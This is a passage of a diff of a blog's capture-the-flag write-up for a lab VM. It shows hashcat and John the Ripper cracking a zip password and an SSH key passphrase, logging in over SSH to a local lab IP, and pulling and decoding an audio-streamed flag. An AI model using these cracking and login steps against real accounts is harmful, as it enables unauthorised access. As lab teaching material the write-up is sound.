-Hash.Target......: $zip2$*0*1*0*05ed2b46cc5c8fdd*4dfb*14*3c099c875a5b4e660f310f657f34d7023b638556bc90a38168d5d752454a8954ebe2a08e064153f36afa0eb398f11139fae94e5cb7678dbda653de495847cd9e2c8c03573f6260f349a6e553b3a21647bcb351ae01ef15538cd613b97a144ad97d2f0db50bd29e093ea7772db8e465c5e6019f4427eab1f059241f86091148e8e292171a7cebb85fa07826f8b2061414931b217e63aa187ee508bad16cb1c57993bd703096b77e4e376edd9842e4363e58512b26422cbf1961a4ad741d4ab9d292a447cd6eaccd23e040702edb8be854798a35a63491b07b4c3b820e6c2a394e42a17180720cd9287f953f3482382068df0a98755ee27ba9ee0667b5b813cc3c9105a92d9f76566e9674d0c8ccc4050abeda5089d854546a5a39da8d93da503179dc6e0d847d29ede19654471d5a875e65a81e700810b4b7f1657bf8d78869e8078681dabfc35d0e0bc15fee*321fdfa476052bcf20c6*$/zip2$
-Time.Started.....: Thu Jan 19 16:33:24 2017 (57 secs)
-Time.Estimated...: Thu Jan 19 16:34:21 2017 (0 secs)
-Input.Mask.......: ?1?2?2?2?2 [5]
-Input.Charset....: -1 ?l?d?u, -2 ?l?d, -3 ?l?d*!$@_, -4 Undefined
-Input.Queue......: 5/15 (33.33%)
-Speed.Dev.#1.....:  1262.8 kH/s (11.10ms)
-Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
-Progress.........: 71884800/104136192 (69.03%)
-Rejected.........: 0/71884800 (0.00%)
-Restore.Point....: 1152000/1679616 (68.59%)
-Candidates.#1....: ma7f7 -&gt; mq7g5
-HWMon.Dev.#1.....: Temp: 73c Fan: 56% Util: 95% Core:1911Mhz Mem:3802Mhz Lanes:16
-
-Started: Thu Jan 19 16:33:16 2017
-Stopped: Thu Jan 19 16:34:21 2017
-</code></pre><p>Awesome so the password is <code>m4rl4</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>[firefart@linux hashcat]$ /home/firefart/hacking/JohnTheRipper/run/zip2john /home/firefart/marla.zip
+</span></span><span style="display:flex;"><span>marla.zip:$zip2$*0*1*0*05ed2b46cc5c8fdd*4dfb*14c*3c099c875a5b4e660f310f657f34d7023b638556bc90a38168d5d752454a8954ebe2a08e064153f36afa0eb398f11139fae94e5cb7678dbda653de495847cd9e2c8c03573f6260f349a6e553b3a21647bcb351ae01ef15538cd613b97a144ad97d2f0db50bd29e093ea7772db8e465c5e6019f4427eab1f059241f86091148e8e292171a7cebb85fa07826f8b2061414931b217e63aa187ee508bad16cb1c57993bd703096b77e4e376edd9842e4363e58512b26422cbf1961a4ad741d4ab9d292a447cd6eaccd23e040702edb8be854798a35a63491b07b4c3b820e6c2a394e42a17180720cd9287f953f3482382068df0a98755ee27ba9ee0667b5b813cc3c9105a92d9f76566e9674d0c8ccc4050abeda5089d854546a5a39da8d93da503179dc6e0d847d29ede19654471d5a875e65a81e700810b4b7f1657bf8d78869e8078681dabfc35d0e0bc15fee*321fdfa476052bcf20c6*$/zip2$:::::marla.zip
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[firefart@linux hashcat]$ cat /home/firefart/marla.zip.hash
+</span></span><span style="display:flex;"><span>$zip2$*0*1*0*05ed2b46cc5c8fdd*4dfb*14c*3c099c875a5b4e660f310f657f34d7023b638556bc90a38168d5d752454a8954ebe2a08e064153f36afa0eb398f11139fae94e5cb7678dbda653de495847cd9e2c8c03573f6260f349a6e553b3a21647bcb351ae01ef15538cd613b97a144ad97d2f0db50bd29e093ea7772db8e465c5e6019f4427eab1f059241f86091148e8e292171a7cebb85fa07826f8b2061414931b217e63aa187ee508bad16cb1c57993bd703096b77e4e376edd9842e4363e58512b26422cbf1961a4ad741d4ab9d292a447cd6eaccd23e040702edb8be854798a35a63491b07b4c3b820e6c2a394e42a17180720cd9287f953f3482382068df0a98755ee27ba9ee0667b5b813cc3c9105a92d9f76566e9674d0c8ccc4050abeda5089d854546a5a39da8d93da503179dc6e0d847d29ede19654471d5a875e65a81e700810b4b7f1657bf8d78869e8078681dabfc35d0e0bc15fee*321fdfa476052bcf20c6*$/zip2$
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[firefart@linux hashcat]$ ./hashcat -a 3 -m 13600 /home/firefart/marla.zip.hash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$zip2$*0*1*0*05ed2b46cc5c8fdd*4dfb*14*3c099c875a5b4e660f310f657f34d7023b638556bc90a38168d5d752454a8954ebe2a08e064153f36afa0eb398f11139fae94e5cb7678dbda653de495847cd9e2c8c03573f6260f349a6e553b3a21647bcb351ae01ef15538cd613b97a144ad97d2f0db50bd29e093ea7772db8e465c5e6019f4427eab1f059241f86091148e8e292171a7cebb85fa07826f8b2061414931b217e63aa187ee508bad16cb1c57993bd703096b77e4e376edd9842e4363e58512b26422cbf1961a4ad741d4ab9d292a447cd6eaccd23e040702edb8be854798a35a63491b07b4c3b820e6c2a394e42a17180720cd9287f953f3482382068df0a98755ee27ba9ee0667b5b813cc3c9105a92d9f76566e9674d0c8ccc4050abeda5089d854546a5a39da8d93da503179dc6e0d847d29ede19654471d5a875e65a81e700810b4b7f1657bf8d78869e8078681dabfc35d0e0bc15fee*321fdfa476052bcf20c6*$/zip2$:m4rl4
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Session..........: hashcat
+</span></span><span style="display:flex;"><span>Status...........: Cracked
+</span></span><span style="display:flex;"><span>Hash.Type........: WinZip
+</span></span><span style="display:flex;"><span>Hash.Target......: $zip2$*0*1*0*05ed2b46cc5c8fdd*4dfb*14*3c099c875a5b4e660f310f657f34d7023b638556bc90a38168d5d752454a8954ebe2a08e064153f36afa0eb398f11139fae94e5cb7678dbda653de495847cd9e2c8c03573f6260f349a6e553b3a21647bcb351ae01ef15538cd613b97a144ad97d2f0db50bd29e093ea7772db8e465c5e6019f4427eab1f059241f86091148e8e292171a7cebb85fa07826f8b2061414931b217e63aa187ee508bad16cb1c57993bd703096b77e4e376edd9842e4363e58512b26422cbf1961a4ad741d4ab9d292a447cd6eaccd23e040702edb8be854798a35a63491b07b4c3b820e6c2a394e42a17180720cd9287f953f3482382068df0a98755ee27ba9ee0667b5b813cc3c9105a92d9f76566e9674d0c8ccc4050abeda5089d854546a5a39da8d93da503179dc6e0d847d29ede19654471d5a875e65a81e700810b4b7f1657bf8d78869e8078681dabfc35d0e0bc15fee*321fdfa476052bcf20c6*$/zip2$
+</span></span><span style="display:flex;"><span>Time.Started.....: Thu Jan 19 16:33:24 2017 (57 secs)
+</span></span><span style="display:flex;"><span>Time.Estimated...: Thu Jan 19 16:34:21 2017 (0 secs)
+</span></span><span style="display:flex;"><span>Input.Mask.......: ?1?2?2?2?2 [5]
+</span></span><span style="display:flex;"><span>Input.Charset....: -1 ?l?d?u, -2 ?l?d, -3 ?l?d*!$@_, -4 Undefined
+</span></span><span style="display:flex;"><span>Input.Queue......: 5/15 (33.33%)
+</span></span><span style="display:flex;"><span>Speed.Dev.#1.....:  1262.8 kH/s (11.10ms)
+</span></span><span style="display:flex;"><span>Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
+</span></span><span style="display:flex;"><span>Progress.........: 71884800/104136192 (69.03%)
+</span></span><span style="display:flex;"><span>Rejected.........: 0/71884800 (0.00%)
+</span></span><span style="display:flex;"><span>Restore.Point....: 1152000/1679616 (68.59%)
+</span></span><span style="display:flex;"><span>Candidates.#1....: ma7f7 -&gt; mq7g5
+</span></span><span style="display:flex;"><span>HWMon.Dev.#1.....: Temp: 73c Fan: 56% Util: 95% Core:1911Mhz Mem:3802Mhz Lanes:16
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Started: Thu Jan 19 16:33:16 2017
+</span></span><span style="display:flex;"><span>Stopped: Thu Jan 19 16:34:21 2017
+</span></span></code></pre></div><p>Awesome so the password is <code>m4rl4</code>.</p>
 <p>We are now able to extract the zip file with <code>p7zip</code>.</p>
-<pre tabindex="0"><code>root@kali:~# p7zip -d marla.7z
-
-7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
-p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,1 CPU Intel(R) Core(TM) i7-3520M CPU @ 2.90GHz (306A9),ASM,AES-NI)
-
-Scanning the drive for archives:
-1 file, 1974 bytes (2 KiB)
-
-Extracting archive: marla.7z
-WARNING:
-marla.7z
-Can not open the file as [7z] archive
-The file is open as [zip] archive
-
---
-Path = marla.7z
-Open WARNING: Can not open the file as [7z] archive
-Type = zip
-Physical Size = 1974
-
-
-Enter password (will not be echoed):
-Everything is Ok
-
-Archives with Warnings: 1
-Files: 2
-Size:       2162
-Compressed: 1974
-</code></pre><p>So let&rsquo;s have a look at the extracted files:</p>
-<pre tabindex="0"><code>
-root@kali:~# cat marla.pub
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuh1NziT0vauHjqRvPIDQnFKYYtaYP1h56DXesZ6ZlSezFZVtJ1oQvLh3WJGgH7Bojzwxo4k5xwvw/0fyvCD68GGA99j8wfcYvFQ60BGMUYHfEduQPs0sAmL9tftIUY1vLf6htgCfz8oJ6Pi9YxLkgrS0+udGGxU0rXkU6hfaT710VH2DpvxymXbrKHHnd2wYmf/VVg54ugRyKWjKSBR+IkXTJr0FSMmsb7s1O84r1XTjJUJc6AZkiN1NLMxDQ1xnb/ToCnSpPIDm83fPDLDYhnlNZ2YoVqq9TTYVF9lxBaYLEjhVI+HKFF2geWjnMR5IHU/YwKWodcqh2GYY/LGNV marla@basement
-
-
-root@kali:~# cat marla
------BEGIN RSA PRIVATE KEY-----
-Proc-Type: 4,ENCRYPTED
-DEK-Info: AES-128-CBC,4A3641AA61921099DAB3E32222AE8221
-
-k8zDFT8UXhpb7Dn+KzYv6mYuAI0vF25s/zFpuvtm31FtTwOAzqz+ukei2DR+r4Zb
-QKGV5EPf0ymcx6Nh4X700eRa555hFDrWMRwLAy7bTkYK5MbLY3On7BqBnmpbs/bd
-Pd/VpmvMtUnl8YcMF756NLt0sgqwWbf8DGFUcJZTGEsZhwTL86cCYyFbbdOHijzY
-Wi+OjgVBxw62VrdEn8HHA0Hks72LRGAsXLJ4ReT6nm/6H88idKHtnc1CXGzUtEwR
-E7/Bzzqn/P1rTrnPp/adV4oAC+Q86Sdy5RHuH35KC6c6WgpFRprqeWeLdf6aBBF0
-yadmGUu4PrWP7iYd7Bc4k2Czlr0pk1x0GjqedjFYmPWypllfZvMriQa6QhYkKlGl
-ecEm8Usrok54u8jX1VZtdRu1+6gNPZcw8FOK1GTks2L9ywvWoSNOGr5LFBDBYufq
-SNNUQq0cEyAl3KaPT5vPyEcrqAa7NKmIl5uImECPG93iIsfOt3P4ujVwWuT3p100
-KHnHEybuZXTBRUPmHoE+wXvFyLAWzHG8d6cy18FzGEyogUbs+d5GmdFjsyaaLeES
-8AtkGrWrUAgo/NDpbVdHoLmwjzvxlDkk+Uk3/KN5qjFKajbav9EoMJNeCac1Ax0i
-KHiSvyPtifWu9Mj8IYq6zIVVFoVPc4swDrqxsNkwA8uAXLCIBk/lHOBryIPVmsOd
-4gWhae23ul+HC5gHwlXUfq5Zrljhqpw9D50veSizqdtwmWgvs1crkddXbTwUSvrb
-kZHQoY2PqfJPmF3TNt5RQvwNIaOMospy29niKk/qICaZ1t9KUyMdfNmyVzHGnJPz
-Ae6pdfCsgoymkO1zd4TVaGTRH2tt0ZRXECHPTG/5i8IRJGB4hlTJ4z0QNcVPQGdF
-sI9GuUuRzaIpVbbxf50OG5qWfVRJR2lWwfvIEgmfvKQs9qJBq4X05NeagWoDKhrH
-/90k1S3GI5rw9RyjzD1I4k1li+PjyWs+wZAEn39Hqlxuk+gMWuKCr6Wel/dV3exU
-XlkGJLJo1SUK1Uh2Z6CeSwdSVMf2j21pMbeaw8U9RQund9EOwln8JDKtdQXYW9ba
-SE/hUpvlNHPG/90Tp2JQCkk/MinwV4IGev7mn9piltL8Q7qcU1o9TpAxtdonyaYI
-UYnzpv+g/0fhKnycwRttVukt7Mtgvr0SMCXcImMjdnDpVxbrbEWtLgFsZayg+SzQ
-/03KMOA9AVoo48ZlLa+oERqeedXDBqmKkNJwIsBcYEywHl6NlEHCZk2S/lcr+ra9
-im+l2nua3IvYYIRnWHWoLs0D+Hi/PvQHmj3e2YBeIZMYGPHk8XQ17cofwqU7VDr7
-x6nP22au0LGKTj4+E46r1hEWs9C0X8AMJjfShb+CyN/imo/3a3bJiazE1F5IpKlY
-5UejDh7GCcxnvmjXlY4q+7DeJlz5VSjKjfR5V0b5mkcLEI18c2sBkTVdMVzzBGQO
-kTNSGJSOrF5el9+wlpLY4E8loocJpzH3P3uu+fOwHtNiul5RAlotfJnJd9lYea5k
-W581cgXIWgN6actoiIGZXlHKB5Zsdb3GdmmG0Lb50lsL4GH8MIKDKdumUKSwrT20
------END RSA PRIVATE KEY-----
-</code></pre><p>Crap, another encrypted key. But we can see clearly this two files are SSH keys used for connecting as <code>marla</code> to the machine using SSH.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root@kali:~# p7zip -d marla.7z
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+</span></span><span style="display:flex;"><span>p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,1 CPU Intel(R) Core(TM) i7-3520M CPU @ 2.90GHz (306A9),ASM,AES-NI)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Scanning the drive for archives:
+</span></span><span style="display:flex;"><span>1 file, 1974 bytes (2 KiB)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Extracting archive: marla.7z
+</span></span><span style="display:flex;"><span>WARNING:
+</span></span><span style="display:flex;"><span>marla.7z
+</span></span><span style="display:flex;"><span>Can not open the file as [7z] archive
+</span></span><span style="display:flex;"><span>The file is open as [zip] archive
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--
+</span></span><span style="display:flex;"><span>Path = marla.7z
+</span></span><span style="display:flex;"><span>Open WARNING: Can not open the file as [7z] archive
+</span></span><span style="display:flex;"><span>Type = zip
+</span></span><span style="display:flex;"><span>Physical Size = 1974
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Enter password (will not be echoed):
+</span></span><span style="display:flex;"><span>Everything is Ok
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Archives with Warnings: 1
+</span></span><span style="display:flex;"><span>Files: 2
+</span></span><span style="display:flex;"><span>Size:       2162
+</span></span><span style="display:flex;"><span>Compressed: 1974
+</span></span></code></pre></div><p>So let&rsquo;s have a look at the extracted files:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root@kali:~# cat marla.pub
+</span></span><span style="display:flex;"><span>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuh1NziT0vauHjqRvPIDQnFKYYtaYP1h56DXesZ6ZlSezFZVtJ1oQvLh3WJGgH7Bojzwxo4k5xwvw/0fyvCD68GGA99j8wfcYvFQ60BGMUYHfEduQPs0sAmL9tftIUY1vLf6htgCfz8oJ6Pi9YxLkgrS0+udGGxU0rXkU6hfaT710VH2DpvxymXbrKHHnd2wYmf/VVg54ugRyKWjKSBR+IkXTJr0FSMmsb7s1O84r1XTjJUJc6AZkiN1NLMxDQ1xnb/ToCnSpPIDm83fPDLDYhnlNZ2YoVqq9TTYVF9lxBaYLEjhVI+HKFF2geWjnMR5IHU/YwKWodcqh2GYY/LGNV marla@basement
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root@kali:~# cat marla
+</span></span><span style="display:flex;"><span>-----BEGIN RSA PRIVATE KEY-----
+</span></span><span style="display:flex;"><span>Proc-Type: 4,ENCRYPTED
+</span></span><span style="display:flex;"><span>DEK-Info: AES-128-CBC,4A3641AA61921099DAB3E32222AE8221
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>k8zDFT8UXhpb7Dn+KzYv6mYuAI0vF25s/zFpuvtm31FtTwOAzqz+ukei2DR+r4Zb
+</span></span><span style="display:flex;"><span>QKGV5EPf0ymcx6Nh4X700eRa555hFDrWMRwLAy7bTkYK5MbLY3On7BqBnmpbs/bd
+</span></span><span style="display:flex;"><span>Pd/VpmvMtUnl8YcMF756NLt0sgqwWbf8DGFUcJZTGEsZhwTL86cCYyFbbdOHijzY
+</span></span><span style="display:flex;"><span>Wi+OjgVBxw62VrdEn8HHA0Hks72LRGAsXLJ4ReT6nm/6H88idKHtnc1CXGzUtEwR
+</span></span><span style="display:flex;"><span>E7/Bzzqn/P1rTrnPp/adV4oAC+Q86Sdy5RHuH35KC6c6WgpFRprqeWeLdf6aBBF0
+</span></span><span style="display:flex;"><span>yadmGUu4PrWP7iYd7Bc4k2Czlr0pk1x0GjqedjFYmPWypllfZvMriQa6QhYkKlGl
+</span></span><span style="display:flex;"><span>ecEm8Usrok54u8jX1VZtdRu1+6gNPZcw8FOK1GTks2L9ywvWoSNOGr5LFBDBYufq
+</span></span><span style="display:flex;"><span>SNNUQq0cEyAl3KaPT5vPyEcrqAa7NKmIl5uImECPG93iIsfOt3P4ujVwWuT3p100
+</span></span><span style="display:flex;"><span>KHnHEybuZXTBRUPmHoE+wXvFyLAWzHG8d6cy18FzGEyogUbs+d5GmdFjsyaaLeES
+</span></span><span style="display:flex;"><span>8AtkGrWrUAgo/NDpbVdHoLmwjzvxlDkk+Uk3/KN5qjFKajbav9EoMJNeCac1Ax0i
+</span></span><span style="display:flex;"><span>KHiSvyPtifWu9Mj8IYq6zIVVFoVPc4swDrqxsNkwA8uAXLCIBk/lHOBryIPVmsOd
+</span></span><span style="display:flex;"><span>4gWhae23ul+HC5gHwlXUfq5Zrljhqpw9D50veSizqdtwmWgvs1crkddXbTwUSvrb
+</span></span><span style="display:flex;"><span>kZHQoY2PqfJPmF3TNt5RQvwNIaOMospy29niKk/qICaZ1t9KUyMdfNmyVzHGnJPz
+</span></span><span style="display:flex;"><span>Ae6pdfCsgoymkO1zd4TVaGTRH2tt0ZRXECHPTG/5i8IRJGB4hlTJ4z0QNcVPQGdF
+</span></span><span style="display:flex;"><span>sI9GuUuRzaIpVbbxf50OG5qWfVRJR2lWwfvIEgmfvKQs9qJBq4X05NeagWoDKhrH
+</span></span><span style="display:flex;"><span>/90k1S3GI5rw9RyjzD1I4k1li+PjyWs+wZAEn39Hqlxuk+gMWuKCr6Wel/dV3exU
+</span></span><span style="display:flex;"><span>XlkGJLJo1SUK1Uh2Z6CeSwdSVMf2j21pMbeaw8U9RQund9EOwln8JDKtdQXYW9ba
+</span></span><span style="display:flex;"><span>SE/hUpvlNHPG/90Tp2JQCkk/MinwV4IGev7mn9piltL8Q7qcU1o9TpAxtdonyaYI
+</span></span><span style="display:flex;"><span>UYnzpv+g/0fhKnycwRttVukt7Mtgvr0SMCXcImMjdnDpVxbrbEWtLgFsZayg+SzQ
+</span></span><span style="display:flex;"><span>/03KMOA9AVoo48ZlLa+oERqeedXDBqmKkNJwIsBcYEywHl6NlEHCZk2S/lcr+ra9
+</span></span><span style="display:flex;"><span>im+l2nua3IvYYIRnWHWoLs0D+Hi/PvQHmj3e2YBeIZMYGPHk8XQ17cofwqU7VDr7
+</span></span><span style="display:flex;"><span>x6nP22au0LGKTj4+E46r1hEWs9C0X8AMJjfShb+CyN/imo/3a3bJiazE1F5IpKlY
+</span></span><span style="display:flex;"><span>5UejDh7GCcxnvmjXlY4q+7DeJlz5VSjKjfR5V0b5mkcLEI18c2sBkTVdMVzzBGQO
+</span></span><span style="display:flex;"><span>kTNSGJSOrF5el9+wlpLY4E8loocJpzH3P3uu+fOwHtNiul5RAlotfJnJd9lYea5k
+</span></span><span style="display:flex;"><span>W581cgXIWgN6actoiIGZXlHKB5Zsdb3GdmmG0Lb50lsL4GH8MIKDKdumUKSwrT20
+</span></span><span style="display:flex;"><span>-----END RSA PRIVATE KEY-----
+</span></span></code></pre></div><p>Crap, another encrypted key. But we can see clearly this two files are SSH keys used for connecting as <code>marla</code> to the machine using SSH.</p>
 <p>Again, JohnTheRipper has a script ready for us: <code>sshng2john.py</code></p>
-<pre tabindex="0"><code>[firefart@linux run]$ /home/firefart/hacking/JohnTheRipper/run/sshng2john.py /home/firefart/marla.key &gt; /home/firefart/marla
-[firefart@linux run]$ ./john /home/firefart/marla.key
-Using default input encoding: UTF-8
-No password hashes loaded (see FAQ)
-[firefart@linux run]$ ./john /home/firefart/marla
-Using default input encoding: UTF-8
-Loaded 1 password hash (SSH-ng [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
-Will run 8 OpenMP threads
-Note: This format may emit false positives, so it will keep trying even after
-finding a possible candidate.
-Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
-singer           (/home/firefart/marla.key)
-singer           (/home/firefart/marla.key)
-</code></pre><p>Jeah so the key password is <code>singer</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>[firefart@linux run]$ /home/firefart/hacking/JohnTheRipper/run/sshng2john.py /home/firefart/marla.key &gt; /home/firefart/marla
+</span></span><span style="display:flex;"><span>[firefart@linux run]$ ./john /home/firefart/marla.key
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>No password hashes loaded (see FAQ)
+</span></span><span style="display:flex;"><span>[firefart@linux run]$ ./john /home/firefart/marla
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded 1 password hash (SSH-ng [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+</span></span><span style="display:flex;"><span>Will run 8 OpenMP threads
+</span></span><span style="display:flex;"><span>Note: This format may emit false positives, so it will keep trying even after
+</span></span><span style="display:flex;"><span>finding a possible candidate.
+</span></span><span style="display:flex;"><span>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+</span></span><span style="display:flex;"><span>singer           (/home/firefart/marla.key)
+</span></span><span style="display:flex;"><span>singer           (/home/firefart/marla.key)
+</span></span></code></pre></div><p>Jeah so the key password is <code>singer</code>.</p>
 <p>We can now use this password to retreive the next flag:</p>
-<pre tabindex="0"><code>root@kali:~# ssh -i marla marla@192.168.56.101
-The authenticity of host &#39;192.168.56.101 (192.168.56.101)&#39; can&#39;t be established.
-ECDSA key fingerprint is SHA256:CGwzPRVhg2hHuFrgbZjV6MHx+xXtDLYXCzQJO3PrH4U.
-Are you sure you want to continue connecting (yes/no)? yes
-Warning: Permanently added &#39;192.168.56.101&#39; (ECDSA) to the list of known hosts.
-Enter passphrase for key &#39;marla&#39;:
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-well done! your flag is flag{l4y3rs_up0n_l4y3rs}
-Connection to 192.168.56.101 closed.
-</code></pre><h1 id="marla-2">marla #2</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root@kali:~# ssh -i marla marla@192.168.56.101
+</span></span><span style="display:flex;"><span>The authenticity of host &#39;192.168.56.101 (192.168.56.101)&#39; can&#39;t be established.
+</span></span><span style="display:flex;"><span>ECDSA key fingerprint is SHA256:CGwzPRVhg2hHuFrgbZjV6MHx+xXtDLYXCzQJO3PrH4U.
+</span></span><span style="display:flex;"><span>Are you sure you want to continue connecting (yes/no)? yes
+</span></span><span style="display:flex;"><span>Warning: Permanently added &#39;192.168.56.101&#39; (ECDSA) to the list of known hosts.
+</span></span><span style="display:flex;"><span>Enter passphrase for key &#39;marla&#39;:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The programs included with the Debian GNU/Linux system are free software;
+</span></span><span style="display:flex;"><span>the exact distribution terms for each program are described in the
+</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span style="display:flex;"><span>permitted by applicable law.
+</span></span><span style="display:flex;"><span>well done! your flag is flag{l4y3rs_up0n_l4y3rs}
+</span></span><span style="display:flex;"><span>Connection to 192.168.56.101 closed.
+</span></span></code></pre></div><h2 id="marla-2">marla #2<a href="#marla-2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>By looking at the running processes there seems to be an audio stream of a flag streamed by <code>marla</code> and a binary only accepting connections from localhost run by <code>robert</code>.</p>
-<pre tabindex="0"><code>marla     3785  4.5  6.2 464280 31612 ?        S    02:10   0:06 ffserver -f /home/marla/ffserver.conf
-marla     3787 94.4  6.3 462656 32204 ?        R    02:10   2:10 ffmpeg -stream_loop -1 -f wav -i /home/marla/flag.wav http://127.0.0.1:8090/feed1.ffm
-robert    3782  0.0  0.5  19644  2808 ?        S    02:10   0:00 socat TCP-LISTEN:10001,reuseaddr,fork,range=127.0.0.1/32 EXEC:./tenbytes,pty,stderr,echo=0
-</code></pre><p>First we try the streaming webserver:</p>
-<pre tabindex="0"><code>$ nc 127.0.0.1 8090
-GET / HTTP/1.0
-
-HTTP/1.0 301 Moved
-Location: http://localhost/flag.mpg
-Content-type: text/html
-</code></pre><p>So we need to get a file called <code>flag.mpg</code>. As this file is streamed endlessly we need to kill the download after a while as it will never end.</p>
-<pre tabindex="0"><code>wget http://127.0.0.1:8090/flag.mpg
-</code></pre><p>By downloading the mpg and listening to it locally, we can hear a computer generated voice saying the following numbers:</p>
-<pre tabindex="0"><code>102 108 97 103 123 98 82 52 105 110 95 112 97 82 97 115 49 116 101 36 125
-</code></pre><p>By decoding the numbers as ascii, we get the second flag <code>flag{bR4in_paRas1te$}</code></p>
-<pre tabindex="0"><code>a = &#34;102 108 97 103 123 98 82 52 105 110 95 112 97 82 97 115 49 116 101 36 125&#34;
-b = &#34;&#34;
-for x in a.split(&#34; &#34;):
-	b += chr(int(x))
-print(b)
-</code></pre><h1 id="tyler">tyler</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>marla     3785  4.5  6.2 464280 31612 ?        S    02:10   0:06 ffserver -f /home/marla/ffserver.conf
+</span></span><span style="display:flex;"><span>marla     3787 94.4  6.3 462656 32204 ?        R    02:10   2:10 ffmpeg -stream_loop -1 -f wav -i /home/marla/flag.wav http://127.0.0.1:8090/feed1.ffm
+</span></span><span style="display:flex;"><span>robert    3782  0.0  0.5  19644  2808 ?        S    02:10   0:00 socat TCP-LISTEN:10001,reuseaddr,fork,range=127.0.0.1/32 EXEC:./tenbytes,pty,stderr,echo=0
+</span></span></code></pre></div><p>First we try the streaming webserver:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$ nc 127.0.0.1 8090
+</span></span><span style="display:flex;"><span>GET / HTTP/1.0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HTTP/1.0 301 Moved
+</span></span><span style="display:flex;"><span>Location: http://localhost/flag.mpg
+</span></span><span style="display:flex;"><span>Content-type: text/html
+</span></span></code></pre></div><p>So we need to get a file called <code>flag.mpg</code>. As this file is streamed endlessly we need to kill the download after a while as it will never end.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>wget http://127.0.0.1:8090/flag.mpg
+</span></span></code></pre></div><p>By downloading the mpg and listening to it locally, we can hear a computer generated voice saying the following numbers:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>102 108 97 103 123 98 82 52 105 110 95 112 97 82 97 115 49 116 101 36 125
+</span></span></code></pre></div><p>By decoding the numbers as ascii, we get the second flag <code>flag{bR4in_paRas1te$}</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>a = &#34;102 108 97 103 123 98 82 52 105 110 95 112 97 82 97 115 49 116 101 36 125&#34;
+</span></span><span style="display:flex;"><span>b = &#34;&#34;
+</span></span><span style="display:flex;"><span>for x in a.split(&#34; &#34;):
+</span></span><span style="display:flex;"><span>    b += chr(int(x))
+</span></span><span style="display:flex;"><span>print(b)
